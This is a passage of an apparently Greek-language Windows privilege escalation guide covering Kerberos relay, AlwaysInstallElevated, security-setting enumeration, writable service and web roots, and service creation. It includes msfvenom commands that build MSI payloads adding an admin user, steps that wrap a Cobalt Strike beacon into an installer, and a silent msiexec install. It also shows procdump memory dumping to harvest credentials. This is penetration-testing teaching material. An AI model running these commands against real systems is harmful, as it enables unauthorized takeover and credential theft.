Ένα τοπικό Kerberos relay μπορεί να επιτρέψει μετάβαση από σύνδεση χρήστη με χαμηλότερα δικαιώματα σε εγγραφή προνομιακού καταλόγου, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και η αναμεταδιδόμενη αρχή έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay documents](https://github.com/cube0x0/KrbRelay) υποστηρίζει εγγραφές LDAP τόσο για RBCD όσο και για `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί κατάλληλη delegation και δικαιώματα στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον τομέα.

Ελέγξτε την πραγματική πολιτική του DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), το ACL αντικειμένου της αναμεταδιδόμενης ταυτότητας, καθώς και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Ο τύπος σύνδεσης του καλούντος και το περιβάλλον διαπιστευτηρίων έχουν σημασία: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή μια σύνδεση new-credentials. Η δρομολόγηση firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να επηρεάσουν το αποτέλεσμα. Αντιμετωπίστε μια permissive πολιτική ή ένα ACL που ταιριάζει ως υποψήφιο για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί COM coercion, relay authentication ή εγγραφές καταλόγου. Ένα shadow credential λογαριασμού υπολογιστή μπορεί να οδηγήσει σε machine ticket και, μόνο αν αυτός ο λογαριασμός διαθέτει τα απαιτούμενα δικαιώματα αναπαραγωγής καταλόγου, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτές οι 2 τιμές μητρώου είναι **ενεργοποιημένες** (η τιμή είναι **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο δικαιωμάτων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το δυαδικό αρχείο που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτό το εργαλείο. Σημειώστε ότι μπορείτε να τυλίξετε ένα αρχείο "**.bat**" αν θέλετε **μόνο** να **εκτελέσετε** **γραμμές εντολών**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το έργο **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε ένα όνομα στο έργο, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** ως τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων προς συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Finish**.
- Επιλέξτε το έργο **AlwaysPrivesc** στο **Solution Explorer** και, στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως οι **Author** και **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο έργο και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι διασφαλίζεται ότι το payload Beacon θα εκτελεστεί μόλις εκτελεστεί το πρόγραμμα εγκατάστασης.
- Στην ενότητα **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **δημιουργήστε το**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να κάνετε exploit σε αυτή την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, γι’ αυτό πρέπει να δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding: έχει ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε ένα domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης τοπικού admin, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **οι κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Από τα **Windows 8.1** και έπειτα, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA), ώστε να **αποκλείει** απόπειρες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές, όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες σχετικά με το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Αποθηκευμένα διαπιστευτήρια

Τα **διαπιστευτήρια τομέα** επαληθεύονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη επαληθεύονται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα αποθηκευμένα διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχει ενδιαφέροντα δικαιώματα.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ενδέχεται να μπορείτε να κλιμακώσετε τα προνόμιά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς μπορείτε να τις εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Sessions

```bash
qwinsta
klist sessions
```

### Προσωπικοί φάκελοι

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την απαρίθμηση των διεργασιών **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο δυαδικό αρχείο που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του δυαδικού αρχείου, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τα εκμεταλλευτείτε για κλιμάκωση προνομίων.

Ένας listener debugger μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα μεμονωμένο στιγμιότυπο παθητικής σάρωσης θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που εντοπίζετε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα πρόσβασης σε αυτόν από τον χρήστη με χαμηλότερα προνόμια· το όνομα μιας εφαρμογής ή μια debug flag από μόνα τους δεν αποδεικνύουν εκτέλεση κώδικα μεταξύ χρηστών. Περιορίστε τη συνήθη απαρίθμηση σε παθητικές μεθόδους αντί να στέλνετε εντολές debugger.

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν `dynamicpreprocessor directory` που δηλώνεται στο configuration που επιλέγεται με `snort.exe -c <config>`. Για scheduled task ή service που εκτελεί το Snort με διαφορετικό account, ελέγξτε το συγκεκριμένο configuration και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργεί αρχεία εκεί, η διαδρομή αξίζει να διερευνηθεί ως πιθανή οδός για code execution την επόμενη φορά που το task ή το service θα φορτώσει modules. Επαληθεύστε τα πραγματικά privileges του account εκτέλεσης, το ενεργό configuration, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή share· ένας εγγράψιμος κατάλογος από μόνος του δεν αποδεικνύει privilege escalation. Η [τεκμηρίωση dynamic-preprocessor του Snort](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά την εκτέλεση.

### Προνομιούχο web service με εγγράψιμο document root

Σε εγκατάσταση Apache στα Windows, συγκρίνετε τη διαδρομή του executable του service και το account εκτέλεσής του με το `DocumentRoot` στο ενεργό `httpd.conf`. Για μια συμβατική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του διαμορφωμένου document root, που συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα privileges μπορεί να δημιουργεί αρχεία σε αυτό το root ενώ ο Apache εκτελείται ως `LocalSystem`, η εκτέλεση server-side κώδικα μπορεί να υπερβεί τα όρια privileges του host. Επιβεβαιώστε ότι το service εκτελείται, ότι σερβίρεται η ακριβής διαδρομή και ότι ένας server-side handler επεξεργάζεται τον τύπο αρχείου· ένα εγγράψιμο root από μόνο του αποδεικνύει μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε μια έκδοση του `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ή σε `C:\wamp\...` για διάταξη 32 bit), με τη διαμόρφωση δίπλα της, στο `conf\httpd.conf`, και με προεπιλεγμένο root το `C:\wamp64\www` ή το `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, την ταυτότητα εκτέλεσής της, το ενεργό `DocumentRoot` (συμπεριλαμβανομένης της επέκτασης του `${INSTALL_DIR}` και των παρακάμψεων virtual host) και τα ACL του root. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι εκτελεί το υποβληθέν αρχείο. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο IIS root και ταυτότητα δικτύου του application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε έναν **ενεργό ιστότοπο/εφαρμογή** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το διαμορφωμένο pool και τον server-side handler. Ο κώδικας σε έναν κατάλογο που εξυπηρετείται εκτελείται ως το pool μόνο εάν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Ελέγξτε τα πραγματικά δικαιώματα του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του ιστότοπου, τον handler και τις παρακάμψεις ανά διαδρομή, πριν θεωρήσετε ότι ένας εγγράψιμος κατάλογος επιτρέπει εκτέλεση κώδικα.

Η δυναμική μεταγλώττιση ASP.NET δημιουργεί μια ξεχωριστή διαδρομή προς διερεύνηση: τα αρχεία που δημιουργούνται στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλεγμένη θέση είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να την αλλάξει. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token χαμηλότερων προνομίων μπορεί να τροποποιήσει τον παραγόμενο κώδικα στον **συγκεκριμένο** cache της εφαρμογής, εξακριβώστε αν η εφαρμογή τον μεταγλωττίζει ξανά υπό μια πιο προνομιούχα [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε τον cache με την ενεργή εφαρμογή, το ενεργό token και το ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα διεργασίας και τον χρόνο τυχόν επαναμεταγλώττισης. Χρησιμοποιήστε μόνο ανάγνωση μεταδεδομένων· μην ενεργοποιείτε τη μεταγλώττιση και μην τροποποιείτε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool που έχει ρυθμιστεί ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως πραγματοποιεί authentication σε πόρους τομέα ως **λογαριασμός του υπολογιστή-host**, παρόλο που το τοπικό του token μπορεί να έχει χαμηλά προνόμια. Το `LocalSystem` έχει ήδη υψηλά προνόμια τοπικά και χρησιμοποιεί επίσης τον λογαριασμό του υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί τον λογαριασμό που έχει ρυθμιστεί για αυτό. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Αν δεν έχει οριστεί ταυτότητα, μπορεί να ισχύουν οι προεπιλογές του pool, οι οποίες διαφέρουν ανά γενιά IIS· επομένως, προσδιορίστε την ενεργή διαμόρφωση αντί να βασιστείτε στο όνομα του pool. Αν η εκτέλεση κώδικα φτάνει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού μηχανήματος ή ο ρόλος του host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να εξετάζει τη διαμόρφωση και τα ACL χωρίς μεταφόρτωση αρχείου, πραγματοποίηση authentication στο δίκτυο ή αίτημα για tickets.

Για έναν αναγνώσιμο ASP.NET handler που εκκινεί βοηθητική διεργασία, ακολουθήστε κάθε τιμή που προέρχεται από request καθώς περνά από authentication, αποκρυπτογράφηση, validation και κατασκευή εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token στο `ProcessStartInfo("cmd", "/c ...")` ενδέχεται να επιτρέπει σε shell metacharacters να αλλάξουν την εντολή· [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Επιβεβαιώστε ότι ένας μη έμπιστος caller μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και στη συνέχεια προσδιορίστε την ενεργή ταυτότητα του application pool ή την ταυτότητα μέσω impersonation, καθώς και την ταυτότητα της child process. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας localhost listener ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση εντολών με αυξημένα προνόμια. Εξετάστε τον πηγαίο κώδικα και τη διαμόρφωση του pool χωρίς να στέλνετε πλαστά requests ή να εκτελείτε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP στα Windows, μια διαδρομή που ελέγχεται από request και περνά στο [`include` or `require`](https://www.php.net/manual/en/function.include.php) μπορεί να αξιολογήσει ένα αρχείο PHP που μπορεί να τροποποιήσει ένας χρήστης χαμηλότερων προνομίων, υπό την ταυτότητα του worker. Επιβεβαιώστε ότι το request μπορεί να φτάσει σε αυτή τη δήλωση, ότι η επιλυμένη διαδρομή δείχνει σε αρχείο που μπορεί να τροποποιήσει ο χρήστης χαμηλότερων προνομίων και να διαβάσει ο worker, ότι οι σχετικοί περιορισμοί διαδρομών της PHP επιτρέπουν το include και ότι ο worker εκτελείται πράγματι με υψηλότερα προνόμια. Ένας loopback listener ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτή την αλυσίδα· εξετάστε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL των αρχείων, χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Memory Password mining

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που εκτελείται, χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**· δοκιμάστε να κάνετε dump τη μνήμη και να διαβάσετε τα credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt" και κάντε κλικ στο "Click to open Command Prompt"

### Εισαγωγή αρχείων έργου με αυξημένα δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα έργα από έναν κατάλογο απόθεσης στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα δικαιώματα, διασχίζει ένα όριο εμπιστοσύνης εισόδου στο πλαίσιο του λογαριασμού του προγράμματος εισαγωγής. Ελέγξτε την **ακριβή εγγράψιμη διαδρομή**, τη διεργασία ή την εργασία που την ανοίγει, την αποτελεσματική ταυτότητά της και την έκδοση του parser. Ένα [ιστορικό ζήτημα ανοίγματος/επαναφοράς έργου στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε τη χρήση external entities XML στα μεταδεδομένα του έργου· μια δικτυακή οντότητα στα Windows θα μπορούσε να προκαλέσει έλεγχο ταυτότητας από τον λογαριασμό εισαγωγής, εφόσον το επιτρέπουν η [πολιτική εξερχόμενου SMB και NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεσης πρόσβασης διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται με βάση την πραγματική κατάσταση των patches τους. Μην ανοίγετε ένα ειδικά διαμορφωμένο έργο κατά την παθητική απαρίθμηση· ελέγξτε τη ροή εργασίας εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές αίτημα πρόσβασης μόνο για ανάγνωση [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService επιστρέφει ένα handle`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης υπηρεσίας που ζητήθηκαν κατά τη δημιουργία· το μεταγενέστερο άνοιγμα της υπηρεσίας εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το αποτελεσματικό τοπικό ή απομακρυσμένο token, τα δικαιώματα που παραχωρήθηκαν στο handle, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου αρχείου. Μην δημιουργείτε ή εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει **η ίδια σύνδεση δικτύου**, το υποκείμενο NTFS ACL του και μια τοπική διαδρομή εκτελέσιμου αρχείου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός μη διαχειριστή μπορεί να διασχίσει αυτό το όριο αν συνυπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η δυνατότητα τοποθέτησης αρχείων· ένα administrative share δεν είναι απαραίτητη προϋπόθεση. Η δυνατότητα εγγραφής σε share από μόνη της ή μια ένδειξη δικαιώματος δημιουργίας υπηρεσίας μέσω SCM από μόνη της δεν αποδεικνύει ότι η νέα υπηρεσία μπορεί να εκκινηθεί με υψηλότερη ταυτότητα.

Μια υπάρχουσα υπηρεσία μπορεί να καλεί ένα βοηθητικό εκτελέσιμο αρχείο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν του κύκλου ζωής της, ακόμη κι όταν αυτό το βοηθητικό αρχείο απουσιάζει από το `ImagePath` της. Αν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο στον οποίο μπορεί να γράψει χρήστης με χαμηλότερα δικαιώματα και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, τότε το αρχείο που λείπει ενδέχεται να μπορεί να αντικατασταθεί, υπό προϋποθέσεις. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού αρχείου**, τη διαδρομή του εκτελέσιμου αρχείου μετά την επίλυση και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας στον κατάλογο, την ταυτότητα της υπηρεσίας και την ύπαρξη κατάλληλου trigger κύκλου ζωής. Ένας εγγράψιμος κατάλογος υπηρεσίας ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει το αρχείο· η παθητική επισκόπηση δεν πρέπει να εκκινεί ή να διακόπτει την υπηρεσία.

